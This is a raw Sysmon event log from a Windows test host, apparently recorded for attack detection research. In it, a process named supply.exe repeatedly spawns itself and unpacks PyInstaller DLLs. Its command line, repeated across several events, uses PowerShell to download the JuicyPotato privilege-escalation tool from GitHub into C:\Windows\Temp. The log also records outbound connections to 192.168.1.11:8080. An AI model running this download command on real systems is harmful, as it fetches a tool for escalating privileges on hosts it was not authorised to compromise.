{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.103","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-D605-000000001D00","ProcessId":8536,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85362\\python27.dll","UtcTime":"2021-05-07 12:29:02.103"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2359,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.125656Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328E-6095-D605-000000001D00","ParentProcessId":8536,"ProcessGuid":"747F3D96-328E-6095-D705-000000001D00","ProcessId":8548,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:02.134"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2360,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.139176Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-328C-6095-D105-000000001D00","ProcessId":8472,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50830,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:01.281"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2361,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.450770Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328E-6095-D705-000000001D00","ParentProcessId":8548,"ProcessGuid":"747F3D96-328E-6095-D805-000000001D00","ProcessId":8564,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:02.454"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2362,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.456399Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.478","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-D805-000000001D00","ProcessId":8564,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85642\\msvcm90.dll","UtcTime":"2021-05-07 12:29:02.478"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2363,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.489717Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.478","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-D805-000000001D00","ProcessId":8564,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85642\\msvcp90.dll","UtcTime":"2021-05-07 12:29:02.478"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2364,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.494264Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.494","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-D805-000000001D00","ProcessId":8564,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85642\\msvcr90.dll","UtcTime":"2021-05-07 12:29:02.494"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2365,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.496309Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.509","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-D805-000000001D00","ProcessId":8564,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85642\\python27.dll","UtcTime":"2021-05-07 12:29:02.509"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2366,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.514620Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328E-6095-D805-000000001D00","ParentProcessId":8564,"ProcessGuid":"747F3D96-328E-6095-D905-000000001D00","ProcessId":8576,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:02.531"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2367,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.534277Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-328D-6095-D305-000000001D00","ProcessId":8496,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50832,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:01.637"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2368,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.700134Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328E-6095-D905-000000001D00","ParentProcessId":8576,"ProcessGuid":"747F3D96-328E-6095-DA05-000000001D00","ProcessId":8588,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:02.803"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2369,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.806061Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.822","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-DA05-000000001D00","ProcessId":8588,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85882\\msvcm90.dll","UtcTime":"2021-05-07 12:29:02.822"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2370,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.843545Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.822","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-DA05-000000001D00","ProcessId":8588,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85882\\msvcp90.dll","UtcTime":"2021-05-07 12:29:02.822"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2371,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.843581Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.838","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-DA05-000000001D00","ProcessId":8588,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85882\\msvcr90.dll","UtcTime":"2021-05-07 12:29:02.838"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2372,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.843934Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:02.853","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328E-6095-DA05-000000001D00","ProcessId":8588,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI85882\\python27.dll","UtcTime":"2021-05-07 12:29:02.853"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2373,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.859423Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328E-6095-DA05-000000001D00","ParentProcessId":8588,"ProcessGuid":"747F3D96-328E-6095-DB05-000000001D00","ProcessId":8600,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:02.884"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2374,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:02.886719Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328E-6095-DB05-000000001D00","ParentProcessId":8600,"ProcessGuid":"747F3D96-328F-6095-DC05-000000001D00","ProcessId":8612,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:03.126"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2375,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.129214Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.150","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-DC05-000000001D00","ProcessId":8612,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86122\\msvcm90.dll","UtcTime":"2021-05-07 12:29:03.150"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2376,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.160124Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.150","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-DC05-000000001D00","ProcessId":8612,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86122\\msvcp90.dll","UtcTime":"2021-05-07 12:29:03.150"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2377,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.165714Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.150","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-DC05-000000001D00","ProcessId":8612,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86122\\msvcr90.dll","UtcTime":"2021-05-07 12:29:03.150"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2378,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.165769Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:03.165","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-328F-6095-DC05-000000001D00","ProcessId":8612,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI86122\\python27.dll","UtcTime":"2021-05-07 12:29:03.165"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2379,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.181153Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-328F-6095-DC05-000000001D00","ParentProcessId":8612,"ProcessGuid":"747F3D96-328F-6095-DD05-000000001D00","ProcessId":8624,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:03.193"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2380,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:03.195818Z"}},"Version":5}}
